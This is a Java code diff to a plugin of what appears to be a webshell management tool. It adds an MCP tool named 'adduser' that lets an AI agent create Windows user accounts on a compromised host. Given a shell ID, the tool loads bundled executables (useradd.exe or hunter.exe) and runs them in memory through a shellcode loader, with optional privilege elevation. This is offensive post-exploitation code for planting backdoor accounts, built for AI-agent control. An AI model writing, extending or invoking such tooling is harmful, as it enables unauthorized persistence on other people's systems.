@@ -14,6 +14,11 @@ import core.ui.component.dialog.GOptionPane;
 import util.UiFunction;
 import util.automaticBindClick;
 import util.functions;
+import core.annotation.McpTool;
+import core.annotation.McpParam;
+import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
+import java.util.Map;
 
 import javax.swing.*;
 import java.awt.*;
@@ -89,6 +94,46 @@ public abstract class Useradd implements Plugin {
         }
     }
 
+
+    @McpTool(name = "adduser", desc = "添加 Windows 用户: add1 走 useradd.exe, add2 走 hunter.exe", params = {
+            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
+            @McpParam(name = "user", required = true, desc = "用户名与密码, 如: test pass123"),
+            @McpParam(name = "mode", defaultValue = "add1", desc = "add1=useradd.exe / add2=hunter.exe") })
+    public String mcpAddUser(Map<String, Object> args) {
+        String user = (String) args.get("user");
+        String mode = String.valueOf(args.getOrDefault("mode", "add1"));
+        if (user == null || user.trim().isEmpty()) return "缺少参数: user";
+        if (this.loader == null) {
+            if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
+                this.loader = this.getShellcodeLoader();
+            }
+            if (this.loader == null) {
+                this.loader = this.createLoader();
+            }
+        }
+        if (this.loader == null) return "未找到 ShellcodeLoader";
+        try {
+            byte[] pe;
+            byte[] result;
+            PrintStream sink = new PrintStream(new ByteArrayOutputStream());
+            if ("add2".equalsIgnoreCase(mode)) {
+                pe = functions.readInputStreamAutoClose(Useradd.class.getResourceAsStream("assets/hunter.exe"));
+                result = TH_TOOLS.isGlobalElevateEnabled(this.shellEntity)
+                        ? TH_TOOLS.runPePreferThTools(this.shellEntity, this.loader, "adduser " + user, pe, 6000, sink)
+                        : this.loader.runNetPe("adduser " + user, pe);
+            } else {
+                pe = functions.readInputStreamAutoClose(Useradd.class.getResourceAsStream("assets/useradd.exe"));
+                result = TH_TOOLS.runPePreferThTools(this.shellEntity, this.loader, user, pe, 6000, sink);
+            }
+            return this.encoding.Decoding(result);
+        } catch (Exception e) {
+            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
+        }
+    }
+
+    protected ShellcodeLoader createLoader() {
+        return null;
+    }
 
     public void init(ShellEntity shellEntity) {
         this.shellEntity = shellEntity;
